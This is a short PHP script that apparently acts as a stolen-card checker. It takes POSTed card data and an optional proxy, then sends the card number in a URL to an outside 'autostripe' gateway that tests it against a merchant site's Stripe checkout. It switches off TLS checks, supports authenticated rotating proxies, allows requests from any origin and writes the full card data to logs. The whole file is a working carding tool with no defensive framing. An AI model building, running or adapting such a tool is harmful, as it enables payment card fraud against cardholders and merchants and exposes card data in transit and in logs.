<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
set_time_limit(60);
ini_set('max_execution_time', 60);

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

error_log("[" . date('Y-m-d H:i:s') . "] Request received");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    
    error_log("[" . date('Y-m-d H:i:s') . "] Input: " . json_encode($input));
    
    $cardData = $input['card'] ?? '';
    $proxy = $input['proxy'] ?? '';
    
    if (empty($cardData)) {
        error_log("[" . date('Y-m-d H:i:s') . "] Error: Card data empty");
        echo json_encode(['error' => 'Card data is required']);
        exit;
    }
    
    $apiUrl = 'https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=moxy-roxy.com/cc=' . urlencode($cardData);
    error_log("[" . date('Y-m-d H:i:s') . "] API URL: " . $apiUrl);
    
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $apiUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
        
        if (!empty($proxy)) {
            $proxyParts = explode(':', $proxy);
            $partCount = count($proxyParts);
            
            if ($partCount == 2) {
                curl_setopt($ch, CURLOPT_PROXY, $proxy);
                error_log("[" . date('Y-m-d H:i:s') . "] Using proxy (ip:port): " . $proxy);
            } elseif ($partCount == 4) {
                $proxyHost = $proxyParts[0] . ':' . $proxyParts[1];
                $proxyUser = $proxyParts[2];
                $proxyPass = $proxyParts[3];
                curl_setopt($ch, CURLOPT_PROXY, $proxyHost);
                curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyUser . ':' . $proxyPass);
                error_log("[" . date('Y-m-d H:i:s') . "] Using proxy (ip:port:user:pass): " . $proxyHost . " with auth");
            } else {
                curl_setopt($ch, CURLOPT_PROXY, $proxy);
                error_log("[" . date('Y-m-d H:i:s') . "] Using proxy (unknown format): " . $proxy);
            }
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
        }
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        
        error_log("[" . date('Y-m-d H:i:s') . "] HTTP Code: " . $httpCode);
        error_log("[" . date('Y-m-d H:i:s') . "] Response: " . substr($response, 0, 200));
        
        curl_close($ch);
        
        if ($error) {
            error_log("[" . date('Y-m-d H:i:s') . "] cURL Error: " . $error);
            echo json_encode(['error' => 'Request failed: ' . $error, 'success' => false]);
        } else {
            echo json_encode([
                'success' => true,
                'response' => $response,
                'http_code' => $httpCode,
                'proxy_used' => !empty($proxy),
                'concurrency' => '3' // Added concurrency info
            ]);
        }
    } else {
        error_log("[" . date('Y-m-d H:i:s') . "] cURL not available");
        echo json_encode(['error' => 'cURL is not available', 'success' => false]);
    }
} else {
    error_log("[" . date('Y-m-d H:i:s') . "] Invalid method: " . $_SERVER['REQUEST_METHOD']);
    echo json_encode(['error' => 'Invalid request method. Expected POST, got ' . $_SERVER['REQUEST_METHOD'], 'success' => false]);
}
?>